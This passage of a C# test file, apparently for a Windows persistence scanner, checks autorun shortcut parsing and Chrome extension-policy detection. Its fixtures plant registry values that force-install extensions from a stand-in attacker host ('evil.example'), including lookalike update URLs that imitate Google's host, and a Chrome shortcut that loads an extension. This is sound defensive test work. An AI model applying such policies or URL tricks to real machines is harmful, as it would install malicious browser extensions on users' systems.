        // IDList가 엉뚱한(없는) 경로로 읽혀도 실제로 있는 LinkInfo 대상을 써요.
        env.Files.Add(Startup + "Odd.lnk", new LnkFile { IdList = [@"C:\", "Gone", "old.exe"], LinkInfoPath = Notepad }.Build());
        // 폴더를 여는 바로가기
        env.Files.Add(@"C:\Users\jiyul\Documents\readme.txt");
        env.Files.Add(Startup + "Docs.lnk", new LnkFile { LinkInfoPath = @"C:\Users\jiyul\Documents" }.Build());
        // MSI 광고 바로가기
        env.Files.Add(Startup + "Office.lnk", new LnkFile { RawIdListItems = [[0x71, 0x00, 0x01, 0x02]], Darwin = true }.Build());
        Assert.Empty(new AutorunScanner().Scan(env.Context()));
    }

    [Fact]
    public void UnresolvableShortcutIsLow()
    {
        var env = Env();
        env.Files.Add(Startup + "Broken.lnk", Encoding.ASCII.GetBytes(new string('x', 200)));
        env.Files.Add(Startup + "Shell.lnk", new LnkFile { RawIdListItems = [[0x71, 0x00, 0x01, 0x02]], Arguments = "-run" }.Build());
        var findings = new AutorunScanner().Scan(env.Context()).ToDictionary(f => f.Location);
        Assert.Equal(2, findings.Count);
        Assert.All(findings.Values, f => Assert.Equal(Severity.Low, f.Severity));
        Assert.All(findings.Values, f => Assert.Equal("RUN-002", f.RuleId));
        Assert.Contains(findings[Startup + "Shell.lnk"].Evidence, e => e.Key == "바로가기 인자" && e.Value == "-run");
    }

    [Fact]
    public void RelativePathIsResolvedAgainstShortcutFolder()
    {
        var env = Env();
        const string tool = @"C:\Users\jiyul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\helper\run.exe";
        env.Files.Add(tool);
        env.Files.Add(Startup + "Rel.lnk", new LnkFile { RelativePath = @"..\helper\run.exe" }.Build());
        var f = Assert.Single(new AutorunScanner().Scan(env.Context()));
        Assert.Equal(tool, f.Target);
    }

    [Fact]
    public void BrowserShortcutWithIdListOnlyIsChecked()
    {
        var env = new TestEnv();
        const string chrome = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
        env.Files.Add(chrome);
        env.Files.Add(@"C:\Users\jiyul\Desktop\Chrome.lnk", new LnkFile { IdList = [@"C:\", "Program Files", "Google", "Chrome", "Application", "chrome.exe"], Arguments = "--load-extension=C:\\Users\\jiyul\\ext" }.Build());
        env.Files.Add(@"C:\Users\jiyul\Desktop\Odd.lnk", new LnkFile { RawIdListItems = [[0x71, 0x00, 0x01, 0x02]], Arguments = "--x" }.Build());
        var ctx = env.Context();
        var f = Assert.Single(new BrowserScanner().Scan(ctx));
        Assert.Equal("WEB-006", f.RuleId);
        Assert.Contains(ctx.Coverage.Notes, n => n.Contains("브라우저 바로가기", StringComparison.Ordinal));
    }
}

public class ExtensionSettingsTests
{
    private const string Chrome = @"Software\Policies\Google\Chrome";
    private const string Id = "abcdefghijklmnopabcdefghijklmnop";

    [Fact]
    public void JsonValueWithOffStoreUpdateUrlIsHigh()
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Chrome, "ExtensionSettings",
            $$$"""{"{{{Id}}}":{"installation_mode":"force_installed","update_url":"https://evil.example/u.xml"},"*":{"installation_mode":"blocked"}}""");
        var f = Assert.Single(new BrowserScanner().Scan(env.Context()));
        Assert.Equal("WEB-003", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(Id, f.Target);
        Assert.Equal(@"HKLM\Software\Policies\Google\Chrome\ExtensionSettings", f.Location);
        Assert.Contains(f.Evidence, e => e.Key == "업데이트 주소" && e.Value == "https://evil.example/u.xml");
    }

    [Fact]
    public void JsonValueFromStoreIsMedium_AndListsEveryId()
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.CurrentUser, Chrome, "ExtensionSettings",
            $$"""
            {
              // 관리자 메모
              "{{Id}},ponmlkjihgfedcbaponmlkjihgfedcba": {"installation_mode": "normal_installed", "update_url": "https://clients2.google.com/service/update2/crx"},
              "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb": {"installation_mode": "allowed"},
            }
            """);
        var f = Assert.Single(new BrowserScanner().Scan(env.Context()));
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal($"{Id}, ponmlkjihgfedcbaponmlkjihgfedcba", f.Target);
    }

    [Fact]
    public void SubkeyForm()
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.CurrentUser, Chrome + @"\ExtensionSettings\" + Id, "installation_mode", "force_installed");
        env.Registry.Set(RegHive.CurrentUser, Chrome + @"\ExtensionSettings\" + Id, "update_url", "https://clients2.google.com.evil.example/u.xml");
        env.Registry.Set(RegHive.CurrentUser, Chrome + @"\ExtensionSettings\ponmlkjihgfedcbaponmlkjihgfedcba", "installation_mode", "force_installed");
        env.Registry.Set(RegHive.CurrentUser, Chrome + @"\ExtensionSettings\*", "installation_mode", "blocked");
        var findings = new BrowserScanner().Scan(env.Context()).ToDictionary(f => f.Target!);
        Assert.Equal(2, findings.Count);
        Assert.Equal(Severity.High, findings[Id].Severity);
        Assert.Equal(@"HKCU\Software\Policies\Google\Chrome\ExtensionSettings\" + Id, findings[Id].Location);
        Assert.Equal(Severity.Medium, findings["ponmlkjihgfedcbaponmlkjihgfedcba"].Severity);
    }

    [Theory]
    [InlineData("""{"*":{"installation_mode":"blocked"},"x":{"installation_mode":"allowed"}}""")]
    [InlineData("""{"x":"force_installed"}""")]
    [InlineData("""["force"]""")]
    [InlineData("""{"broken": """)]
    [InlineData("")]
    public void BlockOnlyOrMalformedWithoutInstallIsNotReported(string json)
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Chrome, "ExtensionSettings", json);
        env.Registry.Set(RegHive.LocalMachine, Chrome, "Other", 1);
        Assert.Empty(new BrowserScanner().Scan(env.Context()));
    }

    [Fact]
    public void MalformedJsonWithInstallModeFallsBackToMedium()
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Chrome, "ExtensionSettings", """{"x":{"installation_mode":"force_installed" """);
        var f = Assert.Single(new BrowserScanner().Scan(env.Context()));
        Assert.Equal("WEB-003", f.RuleId);
        Assert.Equal(Severity.Medium, f.Severity);
    }

    [Theory]
    [InlineData("https://evil.example/clients2.google.com/u.xml", true)]
    [InlineData("https://clients2.google.com.evil.example/u.xml", true)]
    [InlineData("https://clients2.google.com@evil.example/u.xml", true)]
    [InlineData("file:///C:/Users/Public/u.xml", true)]
    [InlineData("not a url", true)]
    [InlineData("https://clients2.google.com/service/update2/crx", false)]
    [InlineData("HTTPS://CLIENTS2.GOOGLE.COM/service/update2/crx", false)]
    [InlineData("clients2.google.com/service/update2/crx", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void OffStoreComparesTheHost(string? url, bool expected) =>
        Assert.Equal(expected, BrowserScanner.IsOffStore(url, "clients2.google.com"));

    [Fact]
    public void ForcelistPathTrickIsHigh()
    {
        var env = new TestEnv();
        env.Registry.Set(RegHive.LocalMachine, Chrome + @"\ExtensionInstallForcelist", "1", Id + ";https://evil.example/clients2.google.com/u.xml");
        Assert.Equal(Severity.High, Assert.Single(new BrowserScanner().Scan(env.Context())).Severity);
    }
}

/// <summary>
/// 테스트용 .lnk 생성기 ([MS-SHLLINK]). IDList(셸 항목), LinkInfo(로컬·네트워크), 상대 경로, 인자, 환경 변수·Darwin 블록을 만들어요.
/// </summary>
internal sealed class LnkFile
{
    /// <summary>IDList 경로 조각. 첫 조각은 "C:\" 또는 "\\host\share"예요.</summary>
    public string[]? IdList { get; init; }

    /// <summary>파일 시스템이 아닌 셸 항목 (크기 필드 없이 내용만).</summary>
    public byte[][]? RawIdListItems { get; init; }

    /// <summary>0이면 확장 블록(0xBEEF0004)을 넣지 않아요.</summary>
    public ushort ExtensionVersion { get; init; } = 9;

    /// <summary>기본 이름 자리에 8.3 짧은 이름(PROGRA~1)을 넣어요.</summary>
    public bool ShortPrimaryNames { get; init; }

    public string? LinkInfoPath { get; init; }

    public string? NetworkShare { get; init; }

    public string? NetworkSuffix { get; init; }

    public string? RelativePath { get; init; }

    public string? Arguments { get; init; }

    public string? EnvironmentTarget { get; init; }

    public bool HasExpString { get; init; }

    public bool Darwin { get; init; }

    public byte[] Build()
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);
        uint flags = 0x80;
        if (IdList is not null || RawIdListItems is not null)
        {
            flags |= 0x1;
        }

        if (LinkInfoPath is not null || NetworkShare is not null)
        {
            flags |= 0x2;
        }

        if (RelativePath is not null)
        {
            flags |= 0x8;
        }

        if (Arguments is not null)
        {
            flags |= 0x20;
        }

        if (HasExpString)
        {
            flags |= 0x200;
        }

        if (Darwin)
        {
            flags |= 0x1000;
        }

        w.Write(0x4C);
        w.Write(new byte[] { 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
        w.Write(flags);
        w.Write(new byte[0x4C - 0x18]);

        if ((flags & 0x1) != 0)
        {
            var items = new List<byte[]>();
            if (IdList is not null)
            {
                items.AddRange(BuildIdList(IdList));
            }

            foreach (var raw in RawIdListItems ?? [])
            {
                items.Add(raw);
            }

            var size = items.Sum(i => i.Length + 2) + 2;
            w.Write((ushort)size);
            foreach (var item in items)
            {
                w.Write((ushort)(item.Length + 2));
                w.Write(item);
            }

            w.Write((ushort)0);
        }

        if (LinkInfoPath is not null)
        {
            WriteLocalLinkInfo(w, LinkInfoPath);
        }
        else if (NetworkShare is not null)
        {
            WriteNetworkLinkInfo(w, NetworkShare, NetworkSuffix ?? string.Empty);
        }

        if (RelativePath is not null)
        {
            w.Write((ushort)RelativePath.Length);
            w.Write(Encoding.Unicode.GetBytes(RelativePath));
        }

        if (Arguments is not null)
        {
            w.Write((ushort)Arguments.Length);
            w.Write(Encoding.Unicode.GetBytes(Arguments));
        }

        if (EnvironmentTarget is not null)
        {
            WriteStringBlock(w, 0xA0000001, EnvironmentTarget);
        }

        if (Darwin)
        {
            WriteStringBlock(w, 0xA0000006, "w_1^VX!!!!!!!!!MKKSkEXCELFiles>tW{~$4Q]c@II=l2xaTO5Z");
        }

        w.Write(0);
        return ms.ToArray();
    }

    private IEnumerable<byte[]> BuildIdList(string[] parts)
    {
        if (parts[0].StartsWith(@"\\", StringComparison.Ordinal))
        {
            // 네트워크 루트 + 공유 항목
            yield return [0x1F, 0x58, .. Guid.Parse("208D2C60-3AEA-1069-A2D7-08002B30309D").ToByteArray()];
            yield return [0xC3, 0x01, 0x81, .. Encoding.Latin1.GetBytes(parts[0] + "\0"), .. Encoding.Latin1.GetBytes("Microsoft Network\0"), 0x00, 0x00];
        }
        else
        {
            // 내 PC + 볼륨 항목
            yield return [0x1F, 0x50, .. Guid.Parse("20D04FE0-3AEA-1069-A2D8-08002B30309D").ToByteArray()];
            var volume = new byte[23];
            volume[0] = 0x2F;
            Encoding.Latin1.GetBytes(parts[0]).CopyTo(volume, 1);
            yield return volume;
        }

        for (var i = 1; i < parts.Length; i++)
        {
            yield return FileEntry(parts[i], isFile: i == parts.Length - 1);
        }
    }

    private byte[] FileEntry(string name, bool isFile)
    {
        var item = new List<byte> { (byte)(isFile ? 0x32 : 0x31), 0x00 };
        item.AddRange(new byte[4]); // 크기
        item.AddRange(new byte[4]); // 수정 시각
        item.AddRange(new byte[2]); // 속성
        var primary = ShortPrimaryNames && (name.Length > 8 || name.Contains(' ')) ? ShortName(name) : name;
        item.AddRange(Encoding.Latin1.GetBytes(primary + "\0"));
        if ((item.Count + 2) % 2 == 1)
        {
            item.Add(0);
        }

        if (ExtensionVersion > 0)
        {
            var extOffset = item.Count + 2;
            var ext = new List<byte>();
            ext.AddRange(new byte[2]); // 크기 (나중에 채워요)
            ext.AddRange(BitConverter.GetBytes(ExtensionVersion));
            ext.AddRange(BitConverter.GetBytes(0xBEEF0004));
            ext.AddRange(new byte[8]); // 만든 시각, 접근 시각
            ext.AddRange(BitConverter.GetBytes((ushort)0x2E));
            if (ExtensionVersion >= 7)
            {
                ext.AddRange(new byte[2 + 8 + 8]);
            }

            ext.AddRange(new byte[2]); // 긴 이름 크기
            if (ExtensionVersion >= 9)
            {
                ext.AddRange(new byte[4]);
            }

            if (ExtensionVersion >= 8)
            {
                ext.AddRange(new byte[4]);
            }

            ext.AddRange(Encoding.Unicode.GetBytes(name + "\0"));
            ext.AddRange(BitConverter.GetBytes((ushort)extOffset));
            var size = BitConverter.GetBytes((ushort)ext.Count);
            ext[0] = size[0];
            ext[1] = size[1];
            item.AddRange(ext);
        }

        return [.. item];
    }

    private static string ShortName(string name)
    {
        var dot = name.LastIndexOf('.');
        var stem = new string((dot > 0 ? name[..dot] : name).Where(char.IsLetterOrDigit).ToArray()).ToUpperInvariant();
        var ext = dot > 0 ? "." + name[(dot + 1)..].ToUpperInvariant()[..Math.Min(3, name.Length - dot - 1)] : string.Empty;
        return stem[..Math.Min(6, stem.Length)] + "~1" + ext;
    }

    private static void WriteLocalLinkInfo(BinaryWriter w, string path)
    {
        var ansi = Encoding.Latin1.GetBytes(path + "\0");
        const int headerSize = 0x1C;
        var suffixOffset = headerSize + ansi.Length;
        w.Write(suffixOffset + 1);
        w.Write(headerSize);
        w.Write(1);
        w.Write(0);
        w.Write(headerSize);
        w.Write(0);
        w.Write(suffixOffset);
        w.Write(ansi);
        w.Write((byte)0);
    }

    private static void WriteNetworkLinkInfo(BinaryWriter w, string share, string suffix)
    {
        var net = Encoding.Latin1.GetBytes(share + "\0");
        var suffixBytes = Encoding.Latin1.GetBytes(suffix + "\0");
        const int headerSize = 0x1C;
        var cnrlSize = 0x14 + net.Length;
        var suffixOffset = headerSize + cnrlSize;
        w.Write(suffixOffset + suffixBytes.Length);
        w.Write(headerSize);
        w.Write(2);
        w.Write(0);
        w.Write(0);
        w.Write(headerSize);
        w.Write(suffixOffset);
        w.Write(cnrlSize);
        w.Write(2);
        w.Write(0x14);
        w.Write(0);
        w.Write(0x00020000);
        w.Write(net);
        w.Write(suffixBytes);
    }

    private static void WriteStringBlock(BinaryWriter w, uint signature, string value)
    {
        w.Write(0x314);
        w.Write(signature);
        var ansi = new byte[260];
        Encoding.Latin1.GetBytes(value).CopyTo(ansi, 0);
        w.Write(ansi);
        var uni = new byte[520];
        Encoding.Unicode.GetBytes(value).CopyTo(uni, 0);
        w.Write(uni);
    }
}
